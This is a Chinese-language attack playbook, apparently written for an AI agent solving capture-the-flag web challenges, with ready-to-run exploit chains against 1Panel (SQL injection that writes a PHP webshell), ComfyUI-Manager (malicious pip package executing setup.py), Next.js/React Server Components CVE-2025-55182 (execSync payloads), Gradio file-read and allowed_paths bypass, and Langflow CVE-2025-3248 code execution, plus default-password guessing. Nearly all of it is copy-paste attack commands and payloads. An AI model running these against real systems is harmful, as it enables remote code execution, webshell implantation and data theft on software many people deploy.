## 阶段六：常见管理面板登录流程

**当遇到管理面板时，先查看 cve-cheatsheet.json 中是否有该面板的登录 API 格式。**

### 6.1 1Panel

> ⚠️ 拿到 psession 后，可优先验证 CVE-2024-39907 SQLi 写文件路线；文件操作端点是否可用必须以当前响应确认。
> 不要因为 Observer 或本 playbook 给出示例就跳过验证，也不要在同一失败结构上重复消耗轮次。

```bash
# 登录 API（密码需 base64 编码）
curl -si http://TARGET:10086/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"name":"1panel","password":"'$(echo -n '1panel_password' | base64)'","authMethod":"session","language":"zh"}'

# 如果有入口码（EntranceCode），加 header：
# -H 'EntranceCode: BASE64(入口码)'
# 入口码通常在前端 JS bundle 中硬编码，或通过 /api/v1/settings/search 获取

# 登录成功后，获取 cookie 中的 psession/1panel_token，用于后续请求

# CVE-2024-39907 SQLi（登录后）
curl -s http://TARGET:10086/api/v1/hosts/command/search \
  -H 'Content-Type: application/json' \
  -b 'psession=YOUR_SESSION' \
  -d '{"page":1,"pageSize":10,"orderBy":"id;ATTACH DATABASE '\''\'/tmp/shell.php'\''\'' AS t;CREATE TABLE t.e(d text);INSERT INTO t.e VALUES('\''\''<?php system($_GET[c]);?>'\''\'')","order":"ascending","name":"a"}'
# 写入 webshell 后访问：curl http://TARGET/tmp/shell.php?c=cat+/flag*
```

### 6.2 宝塔面板 (BT Panel)
```bash
# 登录 API（密码需 md5 编码）
curl -si http://TARGET:8888/login \
  -d "username=admin&password=$(echo -n 'PASSWORD' | md5sum | cut -d' ' -f1)"
```

### 6.3 phpMyAdmin
```bash
curl -si http://TARGET/phpmyadmin/ \
  -d 'pma_username=root&pma_password=&server=1&token=TOKEN'
```

### 6.4 通用登录策略
1. 先试默认弱口令：admin/admin, admin/123456, admin/password, root/toor
2. 再试题目描述中给定的凭据（注意密码可能需要 base64/md5/URL 编码）
3. 查看前端 JS 源码中的登录逻辑（密码编码方式、额外 header、验证码处理）
4. 如果登录失败 3 次，搜索该面板的未授权访问 CVE（可能不需要登录）

### 6.5 ComfyUI-Manager（8188）

> **最短成功链（先做这个，c-02 实测）**  
> 优先：写 `config.ini` + upload sdist + pip install（`/view` 遍历、`git_url` 在 0.0.0.0 下不通，别卡）  
> 1. 写 `config.ini` → `security_level=weak` → `/manager/reboot`  
> 2. `/upload/image` 上传恶意 sdist（filename **不带** `../`）  
> 3. `pip install` 本地 sdist → `setup.py` RCE → 读 flag  
> 重启端点必须是 **`/manager/reboot`**（无 `/api` 前缀；`/api/manager/reboot` = 405）

> **V3.37 源码实测结论（0.0.0.0 实例）**  
> - flag 路径：`/challenge/flag.txt`（+ flag1.txt / flag2.txt / /flag）  
> - `security_level=weak` 在 0.0.0.0 下满足 `is_allowed_security_level('high')`，install/pip 与 install/git_url 都放行  
> - **install/pip 是惰性的但会执行**：写 install-scripts.txt（`/api/userdata/ComfyUI-Manager%2Fstartup-scripts%2Finstall-scripts.txt` 可读）→ 重启时 prestartup 执行并 os.remove；**不是路径 bug**（旧版推断有误）  
> - **install/pip body 是裸文本**（`await request.text()`，非 JSON），正确：`-d '--no-build-isolation file:///ComfyUI/input/x.tar.gz'`  
> - **✅ c-02 实测成功链（必读）**：  
>   1) config.ini：`security_level=weak` + **`use_uv=False`**（uv 不支持 --no-build-isolation）  
>   2) 构造 **标准 sdist**：必须 `python setup.py sdist --formats=gztar`（顶层目录名必须是 `pkg-1.0`，含 PKG-INFO；手写 `tar czf` 顶层目录名不带版本号会导致 pip 25 报 “neither setup.py nor pyproject.toml found”）  
>   3) setup.py 顶部用 **Python open() 写 flag**（不要用 os.system，build 环境里不可靠）：`for p in ['/challenge/flag.txt',...]: open('/ComfyUI/input/pwnflag.txt','w').write(...)`  
>   4) upload sdist → `POST /api/customnode/install/pip` body=`--no-build-isolation file:///ComfyUI/input/evilpkg6-1.0.tar.gz`  
>   5) `GET /manager/reboot` 重启（install-scripts.txt 被执行）→ `GET /view?filename=pwnflag.txt&type=input` 读回 flag  
> - **install/git_url 会阻塞**（git.Repo.clone_from + GitProgress(tqdm) 阻塞 aiohttp 事件循环），file:// 本地仓库也不通 → 别卡 git clone 链  
> - **manager/queue/install 会阻塞**：get_risky_level 硬编码下载 `https://raw.githubusercontent.com/.../custom-node-list.json`（改 config channel_url 无效）→ 无外网时卡死  
> - **git_exe 链**：`GET /customnode/fetch_updates?mode=default` 触发 `remote.fetch()`，git_exe 经 `setup_environment()` 设为 `GIT_PYTHON_GIT_EXECUTABLE`；上传脚本是 644 不可执行 → PermissionError，且同步 git 操作阻塞事件循环（HTTP 000 = 阻塞非崩溃）  
> - ComfyUI-Manager 版本：`GET /manager/version` → V3.37（源码 = ms_337.py + mcore_337.py + prestartup_script.py）

**场景**：ComfyUI + ComfyUI-Manager，端口 8188。

#### A. ✅ 活路：config.ini + 标准 sdist + pip install（c-02 实测）

```bash
TARGET="http://<目标IP>:8188"

# 1) 覆盖 Manager 配置（比 CR 注入更可靠）
# config.ini 至少含：
#   [default]
#   security_level = weak
#   use_uv = False
# （uv 不支持 --no-build-isolation；git_exe / allow_git_url_install 不是本链必需）
curl -s "$TARGET/api/userdata/ComfyUI-Manager%2Fconfig.ini"
curl -s -X POST "$TARGET/api/userdata/ComfyUI-Manager%2Fconfig.ini?overwrite=true" \
  -H 'Content-Type: text/plain' \
  --data-binary @config.ini
curl -s -X POST "$TARGET/manager/reboot" -H 'Content-Type: application/json' -d '{}'
sleep 3

# 2) 本地构造 **标准 sdist**（不要手写 tar czf！）
# setup.py 顶部用 Python open() 写 flag 到 /ComfyUI/input/pwnflag.txt
#   python setup.py sdist --formats=gztar
# 产物顶层必须是 pkg-1.0/ + PKG-INFO；手写 tar 顶层无版本号 → pip 25:
#   "neither setup.py nor pyproject.toml found"
# 卡安装时务必：pip 加 --log，读真实错误再改格式（别猜路径 bug）

# 3) 正常上传（filename 不要 ../）
curl -s -F "image=@evilpkg-1.0.tar.gz;filename=evilpkg-1.0.tar.gz" \
  "$TARGET/upload/image"

# 4) pip install：body 是 **裸文本**（非 JSON）
curl -s -X POST "$TARGET/api/customnode/install/pip" \
  -H 'Content-Type: text/plain' \
  -d '--no-build-isolation file:///ComfyUI/input/evilpkg-1.0.tar.gz'

# 5) 重启执行 install-scripts → /view 读回（读回不是遍历）
curl -s -X POST "$TARGET/manager/reboot" -H 'Content-Type: application/json' -d '{}'
sleep 5
curl -s "$TARGET/view?filename=pwnflag.txt&type=input"
```

备选（同属活路，需 channel 列表有可装 node）：`security_level=weak` 后走
`risky_level=low` 的普通 `/customnode/install`（非 nightly、非 unknown URL）。
`git_exe` / `git_url` 见 §C：0.0.0.0 实例上易阻塞或 PermissionError，各试 ≤1 次后转回本链。
#### B. 备用：CR(`%0d`) 注入降级配置

`db_mode` 写配置时 `\n` 会被转成 tab 续行；用 **`%0d`（CR）不是 `%0a`（LF）**：

```bash
TARGET="http://<目标IP>:8188"
curl -s "$TARGET/api/manager/db_mode?value=none%0dsecurity_level%20%3D%20weak"
curl -s -X POST "$TARGET/manager/reboot" -H "Content-Type: application/json" -d '{}'
sleep 3
curl -s "$TARGET/api/manager/db_mode?value=none%0dallow_git_url_install%20%3D%20true"
curl -s -X POST "$TARGET/manager/reboot" -H "Content-Type: application/json" -d '{}'
# 注入后读回确认；curl 若二次编码 %0d，改用 raw socket 发 \r
```

#### C. 低效路径（各试 ≤1 次，然后转 D 的活路）

| 路径 | 为什么低效（转去 D 的活路，不是"无解"）|
|------|------|
| `/view?filename=../` | 通常 403，烧预算 → 转 upload sdist + pip install |
| `install/git_url` / unknown-URL | 需 `allow_git_url_install` **且** `--listen 127.0.0.1`；0.0.0.0 改不了 → 转 pip install 本地 sdist |
| git_url 回连外网 | 评测常网络隔离；HTTP 000 = clone 阻塞（不是崩溃）→ 转不依赖回连的 upload |
| upload `filename=../../` | commonpath 防护，400 → 正常上传（不带 ../）再 pip install |
| userdata `%2F` 穿越 | 按字面存 → 用 `config.ini` 覆盖法（userdata 可读写 config.ini）|

**关键：这些"低效路径"都有对应的活路（D 节），不是死路。别卡在任何一个上，试一次就转活路。**

同主机其它端口若出现 `len() of NoneType`，补 `url`/`repo` 参数各试一次即可，勿循环。

### 6.6 Dify / React2Shell (CVE-2025-55182) 多版本利用

**场景**：Dify 平台（Next.js App Router + React Server Components），端口通常 3000。

**指纹识别**：
```bash
curl -s http://TARGET:3000 | grep -oE 'data-public-api-prefix|SELF_HOSTED|Dify|next'
```

**关键：不要扫同主机其他端口！**
平台对同一请求结构有 3 次硬预算，端口/网段扫描会一次性烧光并封死通道。
只使用题目给的地址与 Memory 里已验证的端口/拓扑线索；确认其他服务用 `challenge_get_state`，不要 `for port in ...` 扫描。

**React2Shell 验证与利用**（当当前指纹支持且同主机没有更合适入口时）：

**⚠️ 无外网环境 scanner.py 下载不了（SSL 失败/超时）**：评测环境通常无外网，
`curl raw.githubusercontent.com` 会失败。改用下面的**手动 payload**（不依赖 scanner.py）。

**核心原理（记住它，别凭记忆改字段）**：React Server Components 的 Flight 协议在
**校验 action id 之前**就反序列化请求体，所以**任意 `Next-Action` 值（哪怕假的 `x`）**
都能触达漏洞路径——**不需要真实 action id，不用去 chunk 里抓 `$ACTION_ID_`**。
利用是原型污染：劫持 `Chunk.prototype.then` → 触发 `_formData.get`=`Function` 构造器
→ 执行 `_prefix` 里的服务端 JS（`child_process.execSync`）。影响 React RSC ≤19.2.0、
Next.js 15.0.4–16.0.6（App Router / Server Actions 默认开启即中招）。

```bash
# ── 1. 存在性探测（Assetnote 高保真检测，无需 action id）──
# 向空对象引用属性：漏洞版会崩溃 → HTTP 500 且响应体含 E{"digest"
curl -s -i -X POST http://TARGET:3000/ \
  -H 'Next-Action: x' \
  -H 'Content-Type: application/json' \
  -d '["$1:a:a"]'
# 500 + 含 E{"digest"  → 存在漏洞（Flight 反序列化早于 action 校验）
# 200 / 正常处理        → 已打补丁（hasOwnProperty 拦住），放弃 React2Shell 改走其它入口
```

```bash
# ── 2. RCE：回显变体（推荐）——命令输出经 NEXT_REDIRECT 抛回 X-Action-Redirect 头 ──
# 用 -F '字段=<文件' 让 curl 正确处理 multipart 的 CRLF；part 0=恶意 chunk，part 1="$@0"，part 2=[]
cat > /tmp/p0.json <<'EOF'
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('cat /flag* /challenge/flag* 2>/dev/null || id').toString().trim().replace(/\\n/g,' | ');throw Object.assign(new Error('NEXT_REDIRECT'),{digest:`NEXT_REDIRECT;push;/login?a=${res};307;`});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}
EOF
printf '"$@0"' > /tmp/p1.txt
printf '[]'     > /tmp/p2.txt
curl -s -i -X POST http://TARGET:3000/ -H 'Next-Action: x' \
  -F '0=</tmp/p0.json' -F '1=</tmp/p1.txt' -F '2=</tmp/p2.txt' --max-time 20
# flag 在响应头 X-Action-Redirect（或 Location）里 /login?a= 之后，URL 解码即得
```

```bash
# ── 3. RCE：盲执行 / 带外变体（回显头拿不到时用）──
# HTTP 200 会挂到超时；命令仅在服务器端执行，用于落地文件或带外外传
cat > /tmp/pb.json <<'EOF'
{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\"then\":\"$B0\"}","_response":{"_prefix":"process.mainModule.require('child_process').execSync('cat /flag* /challenge/flag* 2>/dev/null > /app/public/f.txt; id');","_formData":{"get":"$1:constructor:constructor"}}}
EOF
printf '"$@0"' > /tmp/p1.txt
curl -s -X POST http://TARGET:3000/ -H 'Next-Action: x' \
  -F '0=</tmp/pb.json' -F '1=</tmp/p1.txt' --max-time 8 || true
# 随后取回落地文件（若静态目录 web 可读）：curl -s http://TARGET:3000/f.txt
```

**payload 字段含义**（改命令只改 `_prefix` 里的 shell，别动结构）：
`"then":"$1:__proto__:then"`=原型污染劫持 then；`"status":"resolved_model"`+`"reason":-1`
=触发 `initializeModelChunk()` 并绕过 toString 检查；`"_formData":{"get":"$1:constructor:constructor"}`
=拿到 `Function` 构造器；`"_prefix"`=传给 `Function()` 执行的服务端 JS。

**响应判读**：

| 响应特征 | 含义 | 下一步 |
|----------|------|--------|
| 探测 `["$1:a:a"]` → 500 + `E{"digest"` | 存在漏洞 | 直接发上面变体 2（回显）payload |
| 变体 2 → `X-Action-Redirect`/`Location` 里 `/login?a=<内容>` | RCE 成功 | URL 解码取 flag；内容为空则换命令路径 |
| 变体 2 → 无回显头但连接挂起/200 | 回显被吞 | 改用变体 3（盲执行 + 落地文件/带外）|
| 探测 → 200 正常、无 `E{"digest"` | 已打补丁 | 放弃 React2Shell，走同主机其它入口 |

**⚠️ 关键陷阱**：
- **不需要真实 action id**：`Next-Action: x` 足够触发；**别再去下载 scanner.py 或抓 `$ACTION_ID_`**
  （无外网 scanner 下不下来；action id 提取对本漏洞是错误路径，凭记忆重建 payload 也会失败）。
- **payload 结构照抄上面文件，只改 `_prefix` 里的 shell 命令**；结构字段（`$1:__proto__:then`、
  `$1:constructor:constructor`、`$B0`/`$B1337`+`$Q2`）是 gadget 链的一部分，动了就不通。
- **不要只看默认端口**——同主机可能多服务；对每个端口独立指纹再选 CVE，端口号本身不是判据。
- 单次命中失败且无新证据时按「验证预算纪律」止损：不扫端口、不轮流试，复用 Memory 已验证线索或 `challenge_get_state`。

### 6.7 Gradio 任意文件读取（CVE-2024-1561）

**⚠️ 靶场刚启动 7860 连接 refused（Connection refused）**：Gradio/uvicorn 启动要几秒到几十秒。
连不上时 `sleep 15` 后重试一次，或 `challenge_get_state` 确认容器状态——**禁止反复
nc/curl 纠结网络**（run-13844 c-08 教训：服务没 ready 时把预算烧光在网络诊断上）。

**场景**：Gradio 应用（端口通常 7860），HTML 含 `gr-`/`gradio-container`。

**核心**：旧版 `/file=` 参数未做路径限制，可读取服务器任意文件。

```bash
# 先指纹确认（一次）
curl -s http://TARGET:7860/ | grep -oE 'gr-|gradio-container|/queue/'

# 命中指纹后，优先一次直读最高价值路径（本平台 flag 通常在 /flag 或 /challenge/）
curl -s 'http://TARGET:7860/file=/flag'

# 只有 /flag 不存在（非 200）时，才根据响应特征换一个路径重试一次，不要连续枚举。
```

**关键**：`/file=` 本身就是遍历入口，不需要登录；优先一次直读 `/flag`，读不到再据响应特征精确定位，不批量枚举路径。

### 6.8 Gradio 4.x 白名单绕过（allowed_paths / File not allowed）

> run-13844 c-05：Gradio **4.12** 对 `/file=` 启用 `allowed_paths`，直接 `/file=/flag`
> 返回 **403 File not allowed**。不要盲枚举绝对路径——先读配置再打。

**指纹**：
```bash
curl -s http://TARGET:7860/ | grep -oE 'gradio|gr-|/queue/'
curl -s http://TARGET:7860/config | head -c 4000   # 看 allowed_paths / root / components
```

**判读**：
| 响应 | 含义 | 下一步 |
|------|------|--------|
| `/file=/flag` → 200 + flag 内容 | 无白名单（旧 CVE） | 直接提交 |
| `/file=...` → 403 `File not allowed` | Gradio 4.x 白名单 | 走下面链，**停止盲枚举** |
| `/file=http://127.0.0.1:...` → 302 | SSRF 重定向（仅跳转、无 body） | 用 SSRF 打内网可回显端点，或改打组件上传/download |

**正确链（按顺序，每步一次）**：
```bash
# 1. 读配置，提取白名单与组件文件根
curl -s http://TARGET:7860/config -o /tmp/gradio_cfg.json
python3 - <<'PY'
import json
d=json.load(open('/tmp/gradio_cfg.json'))
print('keys', list(d)[:20])
for k in ('allowed_paths','root','file_directories','components'):
    if k in d: print(k, d[k] if k!='components' else type(d[k]))
PY

# 2. 只对 allowed_paths 内的相对路径试 /file=（一次 1~2 个，禁止 for 大字典）
#    例：若 allowed 含 /tmp/gradio → curl -s 'http://TARGET:7860/file=/tmp/gradio/...'

# 3. SSRF：/file=http://127.0.0.1:<同机端口>/... 若返回 302，跟 Location 或改打能回显的内网 API
curl -s -D- 'http://TARGET:7860/file=http://127.0.0.1:7860/config' | head -40

# 4. 若首页/组件暴露 download 或 /file= 相对名（favicon、upload 名），只试页面里出现过的名字
```

**禁止**：
- 对 `/file=/flag`、`/file=/etc/passwd`、`/file=/app/...` 做 ≥4 变体循环（会触发验证预算）
- 在 403 后继续猜绝对路径
- 漂到同网段其它 IP 的 :80 服务

### 6.9 协议口（7860 等）HTTP 死后的非 HTTP 探测（c-08）

题目给 `IP:7860` 且 HTTP 空/RST 时：
1. HTTP 最多 2 次；
2. `nc` 静默读 banner → 再发 `\r\n`；
3. **禁止**改打同网段其它 IP 的 `:80` FastAPI（那是实例漂移）；
4. 端口弱信号「Gradio」在 HTTP 已证实不通时作废。

### 6.10 Langflow 未授权 RCE（CVE-2025-3248，默认参数求值）

> **最短成功链**：指纹 `/health` + `/api/v1/version` → **一次** POST  
> `/api/v1/validate/code`，payload 必须放在 **`def f(cmd=...)` 默认参数**里  
> （函数体里的 sleep/os.system **不会执行**，勿据此判死）→ 从 `function.errors[0]` 解 flag。  
> 锁定题目 IP:7860，禁止漂到同网段 :80。

**场景**：7860 端口 + `/health` 返回 ok、`/api/v1/version` 是 Langflow（AI workflow 平台，非 Gradio）。

**⚠️ 关键原理（别被 sleep 测试骗了）**：`/api/v1/validate/code` **确实执行代码，但只在
函数默认参数里**（Python 默认参数在函数定义时求值）。如果你测 `sleep(5)` 或代码体里的
`time.sleep`，函数体不会执行 → 无延迟 → 误判成「静态校验」。**正确姿势是把 payload 放在
`def f(cmd=...)` 的默认参数里**。

**指纹（一次）**：
```bash
curl -s http://TARGET:7860/health
curl -s http://TARGET:7860/api/v1/version   # Langflow < 1.3 命中 CVE-2025-3248
```

**RCE（默认参数求值 + raise Exception 带回显，命中即停）**：
```bash
curl -s -X POST http://TARGET:7860/api/v1/validate/code \
  -H 'Content-Type: application/json' \
  -d '{"code":"def f(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"cat /flag /challenge/flag* 2>/dev/null || id\\\", shell=True))\")):\n  pass"}'
```

**判读**：
- 响应 JSON 的 `function.errors[0]` 里是命令输出，格式类似 `b'xxx'`（bytes 字面量），
  去掉 `b'` 前缀 + unicode_escape 解码即 flag
- 返回体无 errors / 200 空 → 可能是新版（打了补丁），改测 `/api/v1/run/<flow_id>` 的
  flow graph 注入（flow 的 Python 代码节点会执行）
- **不要凭记忆重建 payload**：先 `skill_load("web","product-playbooks.md")` 回看本段逐字复制

**备用 payload（装饰器版，同样定义时执行）**：
```bash
curl -s -X POST http://TARGET:7860/api/v1/validate/code \
  -H 'Content-Type: application/json' \
  -d '{"code":"@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"cat /flag\\\", shell=True))\")\ndef f():\n  pass"}'
```
